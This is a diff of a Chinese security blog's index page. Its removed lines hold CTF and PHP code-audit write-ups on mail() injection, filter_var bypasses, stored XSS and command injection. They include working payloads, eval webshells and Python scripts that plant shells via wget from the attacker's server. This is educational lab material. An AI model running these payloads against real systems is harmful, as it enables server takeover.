-<p>创建一个新的对象$mailer,然后调用send()方法。<br><strong>其中mail()函数使用不当，将存在一定的安全隐患</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $to = <span class="string">'Alice@example.com'</span>;</span><br><span class="line"> $subject = <span class="string">'hello Alice'</span>;</span><br><span class="line"> $message =<span class="string">'&lt;?php phpinfo(); ?&gt;'</span>;</span><br><span class="line"> $headers = <span class="string">"CC: somebodyelse@example.com"</span>;</span><br><span class="line"> $options = <span class="string">'-OQueueDirectory=/tmp -X /var/www/html/rce.php'</span>;</span><br><span class="line"> mail($to,$subject,$message,$headers,$options);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/1.png" alt=""><br><img src="/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/2.png" alt=""><br>然后就会有以下的结果<br><img src="/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/3.png" alt=""></p>
-<p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
-<p>filter_var()函数使用特定的过滤器过滤一个变量。<br>关于filter_var()中FILTER_VALIDATE_EMAIL这个选项作用，参考<a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">点这里</a><br>其中“none of the special characters in this local part are allowed outside quotation marks” ，表示所有的特殊符号必须放在双引号中。 </p>
-<p>filter_var()存在问题：<br>(1)我们在引号中嵌套转义空格仍然能够通过检测。<br>(2)由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗filter_val()使其认为我们仍然在双引号中，这样我们就可以绕过检测。</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -625,7 +784,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -721,11 +880,19 @@
       
         
           
-            <p>这个cms好像洞很多，对于新手似乎比较友好，这个我打算自己试着去挖洞，持续更新….</p>
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>第一个点在注册处，我们可以使用burpsuit，对注册时的数据包进行拦截修改，<br><img src="/2019/07/07/bluecms尝试审计/1.png" alt=""><br>看到数据是传入user.php<br>查看user.php，未有过滤。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'user'</span>).<span class="string">" (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES ('', '$user_name', md5('$pwd'), '$email', '$timestamp', '$timestamp')"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>可以进行存储型的xss攻击<br>构造<code>$email=&lt;script&gt;alert(1)&lt;/script&gt;123@qq.com</code><br><img src="/2019/07/07/bluecms尝试审计/2.png" alt=""><br><img src="/2019/07/07/bluecms尝试审计/3.png" alt=""><br>我们查看源代码<br><img src="/2019/07/07/bluecms尝试审计/4.png" alt=""></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/07/bluecms尝试审计/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -787,7 +954,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -883,27 +1050,19 @@
       
         
           
-            <p>前言：<br>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，<br>shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击</p>
-<p>通过几道题总结一下命令执行攻击</p>
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">	$target=trim($target);</span><br><span class="line">	<span class="comment">// var_dump($target);</span></span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	$substitutions = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">		<span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="comment">// var_dump($target);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		</span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	<span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这道题中，一般执行任意命令的几个常用符号被过滤掉了，所以我们这里使用%0a<br>payload为：<code>127.0.0.1%0awhoami</code><br>%0a作换行操作，在这里相当于先执行ping 127.0.0.1，再执行whoami</p>
-<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$ip = <span class="keyword">isset</span>($_POST[<span class="string">'ip'</span>])?$_POST[<span class="string">'ip'</span>]:<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/i'</span>,$ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ip 格式错误!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> strlen($ip);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($ip)&lt;<span class="number">7</span>||strlen($ip)&gt;<span class="number">21</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ip 长度错误!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		</span><br><span class="line">	$cmd = shell_exec( <span class="string">'ping  '</span> .$ip );</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 1 '</span> .$ip );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br></pre></td></tr></table></figure>
-<p>先尝试如何绕过格式和长度的限制，payload:<code>ip=0.0.0.0|ls</code><br>但是我们读flag的时候就会出现长度错误的情况，<br><img src="/2019/07/01/CTF练习之命令执行漏洞/1.png" alt=""><br>所以我们要通过bash语句将一个bash脚本写入服务器，其中bash脚本的内容可以为带有一句话木马的shell.php，然后运行该bash脚本，写入shell.php到后台<br>python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.199.153/CTF-master/exec/exec2.php"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"echo '&lt;?php @eval($_GET[c]); ?&gt;' &gt;&gt; shell.php"</span>:</span><br><span class="line">    data = &#123;<span class="string">"ip"</span>:<span class="string">"0.0.0.0|echo -n \\"</span>+i+<span class="string">"&gt;&gt;1"</span>&#125;</span><br><span class="line">    req = requests.post(url,data=data)</span><br><span class="line">    print(data[<span class="string">"ip"</span>])</span><br><span class="line">print(<span class="string">"shell upload successfully"</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"ip"</span>:<span class="string">"0.0.0.0|bash 1"</span>&#125;</span><br><span class="line">req = requests.post(url,data=data)</span><br><span class="line">print(<span class="string">"getshell successfully"</span>)</span><br></pre></td></tr></table></figure></p>
-<p>我觉得这里有一个需要注意的地方是关于’\’转义，bash中’\’用于使得特使字符在其作用下，还是为其本身。</p>
-<p>getshell<br><img src="/2019/07/01/CTF练习之命令执行漏洞/2.png" alt=""></p>
-<p>这道题还有另外一种解法:<br>(1)需要自己有一个较短的域名<br>(2)在服务器的根目录下写入一个302跳转<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location: ./1.sh"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>(3)另外在根目录下写入一个bash脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.sh </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;?php @eval($_POST[1]);?&gt;'</span> &gt; shell.php</span><br></pre></td></tr></table></figure></p>
-<p>(4)这两个文件放在同一个目录下,执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip=0.0.0.0;wget i.com </span><br><span class="line">ip=0.0.0.0;sh index.html  <span class="comment">#刚好21个字符</span></span><br></pre></td></tr></table></figure></p>
-<p>然后就获取一个shell  </p>
-<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>升级版的写入shell,然后这个厉害了，七字shell<br>我们可以通过写入文件名的方法，获得一个bash脚本，<br>思路如下<br><img src="/2019/07/01/CTF练习之命令执行漏洞/3.png" alt=""><br>然后我们使用命令：<code>ls -t&gt;a</code><br>我们把bash语句分块写入文件后，倒着写，为了是可以按照写入时间去排列，默认下是按照字母顺序，然后ls -t是让文件名按写入该目录的时间排序，时间后的在前，&gt;a，保存着到a</p>
-<p>运行bash脚本，到我们的域名所在的服务器，去下载shell.php文件，这样就能成功getshell<br>关于这里为什么不echo写入语句话木马，由于字数的限制，所以需要拆分语句$_GET[1]</p>
-<p>这个被拆分后，就无法正常使用，所以我们使用方法二。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetShell</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://192.168.56.129/shell.php?1="</span></span><br><span class="line">    fileNames = [<span class="string">"1.php"</span>,<span class="string">"-O\ \\"</span>,<span class="string">"cn\ \\"</span>,<span class="string">"\ a.\\"</span>,<span class="string">"wget\\"</span>] </span><br><span class="line">    <span class="comment"># linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"</span></span><br><span class="line">    <span class="comment"># 可以修改hosts文件，让a.cn指向一个自己的服务器。</span></span><br><span class="line">    <span class="comment"># 在a.cn 的根目录下创建index.html ，内容是一个php shell </span></span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNames:</span><br><span class="line">        createFileUrl = url+<span class="string">"&gt;"</span>+fileName</span><br><span class="line">        <span class="keyword">print</span> createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line">    getShUrl = url + <span class="string">"ls -t&gt;1"</span></span><br><span class="line">    <span class="keyword">print</span> getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl = url + <span class="string">"sh 1"</span></span><br><span class="line">    <span class="keyword">print</span> getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line">    shellUrl = <span class="string">"http://192.168.56.129/1.php"</span></span><br><span class="line">    response = requests.get(shellUrl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] Get shell !"</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] fail!"</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure></p>
-<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>代码执行漏洞中，如果代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">system(<span class="string">"curl$cmd/flag.php"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>由于执行命令，没有空格，所以这时候想到使用$IFS(内部分隔符),默认可为space,tab,newline<br><em>payload:$cmd=$IFS\file:///var/www/html/exam/flag.php$IFS\CURL</em></p>
-<p>同样也可以通过vps监听端口的方式或者ceye.io来获取flag.php的内容<br>命令执行漏洞，发现对于curl的使用居多。</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/01/CTF练习之命令执行漏洞/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -965,7 +1124,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1061,40 +1220,19 @@
       
         
           
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟着张师傅学习代码审计，依葫芦画瓢，偷瞄大佬博客，跟着学习</p>
-<p>这次是函数filter_var缺陷</p>
-<h1 id="上代码"><a href="#上代码" class="headerlink" title="上代码"></a>上代码</h1><p>参考链接：<br><a href="https://zhzhdoai.github.io/2019/06/02/RIPS-2-filter-vat%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">RIPS[2] | filter_var函数缺陷</a><br><a href="https://mochazz.github.io/2018/07/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day2%20-%20filter_var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">代码审计Day2 - filter_var函数缺陷</a></p>
-<p><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/1.png" alt=""><br>本题考察XSS漏洞。<br>然后这道题中，我们可以看到代码中使用到PHP的一个模块<a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a>.<br>调用了escape方法，，首先<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">escape过滤器</a>,是用PHP内置函数 htmlspecialchars 来实现的.</p>
-<p><strong>htmlspecialchars 函数定义如下：</strong></p>
-<p>htmlspecialchars ：(PHP 4, PHP 5, PHP 7)</p>
-<p>功能 ：将特殊字符转换为 HTML 实体</p>
-<p>定义 ：string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string$encoding = ini_get(“default_charset”) [, bool $double_encode = TRUE ]]] )</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &amp; (&amp; 符号)  ===============  &amp;amp;</span><br><span class="line">&gt; <span class="string">" (双引号)  ===============  &amp;quot;</span></span><br><span class="line"><span class="string">&gt; ' (单引号)  ===============  &amp;apos;</span></span><br><span class="line"><span class="string">&gt; &lt; (小于号)  ===============  &amp;lt;</span></span><br><span class="line"><span class="string">&gt; &gt; (大于号)  ===============  &amp;gt;</span></span><br><span class="line"><span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
-<p>接着代码中又使用了<a href="http://www.w3school.com.cn/php/func_filter_var.asp" target="_blank" rel="noopener"><strong>filter_var()</strong></a>对其进行二次过滤<br>用了 FILTER_VALIDATE_URL 过滤器来判断是否是一个合法的url。</p>
-<p>对于以上代码，可以理解为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">  $url = htmlspecialchars($url);</span><br><span class="line">  var_dump($url);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  $url = filter_var($url,FILTER_VALIDATE_URL);</span><br><span class="line">  var_dump($url);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;a href='$url'&gt;Next slide &gt;&gt;&lt;/a&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里的两个过滤器，我们可以通过javascript伪协议就绕过<br>构造payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url = javascrpit://comment://%250aalert(1);</span><br></pre></td></tr></table></figure></p>
-<p><strong><br>注意：’//‘在JS中是注释的作用，所以我们引入’%0a’,进行换行操作，而这里我们需要先将’%’编码为’%25’，<br>因为当我们发送payload时，后台代码会先将’%25’解析为’%’,再到浏览器解析时，就为’%’
-</strong><br><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/2.png" alt=""></p>
-<h1 id="CMS小试"><a href="#CMS小试" class="headerlink" title="CMS小试"></a>CMS小试</h1><p>审计代码<strong>anchor.0.9.2</strong></p>
-<p>代码文件：themes/default/404.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">'header'</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	&lt;section class="content wrap"&gt;</span><br><span class="line">		&lt;h1&gt;Page not found&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">		&lt;p&gt;Unfortunately, the page &lt;code&gt;/<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span>&lt;/code&gt; could not be found. Your best bet is either to <span class="keyword">try</span> the &lt;a href=<span class="string">"&lt;?php echo base_url(); ?&gt;"</span>&gt;homepage&lt;/a&gt;, <span class="keyword">try</span> &lt;a href=<span class="string">"#search"</span>&gt;searching&lt;/a&gt;, <span class="keyword">or</span> go <span class="keyword">and</span> cry in a corner (although I don’t recommend the latter).&lt;/p&gt;</span><br><span class="line">	&lt;/section&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">'footer'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当我们访问一个不存在的页面时，就会调用404.php,<br>其中关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>跟踪到<br>代码文件：anchor/functions/helpers.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_url</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> Uri::current();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>返回 Uri::current()</p>
-<p>跟踪到<br>代码文件：system/uri.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_null(<span class="keyword">static</span>::$current)) <span class="keyword">static</span>::$current = <span class="keyword">static</span>::detect();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::$current;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>调用静态方法 delect()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// create a server object from global</span></span><br><span class="line">		$server = <span class="keyword">new</span> Server($_SERVER);</span><br><span class="line"></span><br><span class="line">		$try = <span class="keyword">array</span>(<span class="string">'REQUEST_URI'</span>, <span class="string">'PATH_INFO'</span>, <span class="string">'ORIG_PATH_INFO'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span>($try <span class="keyword">as</span> $method) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// make sure the server var exists and is not empty</span></span><br><span class="line">			<span class="keyword">if</span>($server-&gt;has($method) <span class="keyword">and</span> $uri = $server-&gt;get($method)) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// apply a string filter and make sure we still have somthing left</span></span><br><span class="line">				<span class="keyword">if</span>($uri = filter_var($uri, FILTER_SANITIZE_URL)) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// make sure the uri is not malformed and return the pathname</span></span><br><span class="line">					<span class="keyword">if</span>($uri = parse_url($uri, PHP_URL_PATH)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">static</span>::format($uri, $server);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// woah jackie, we found a bad'n</span></span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> 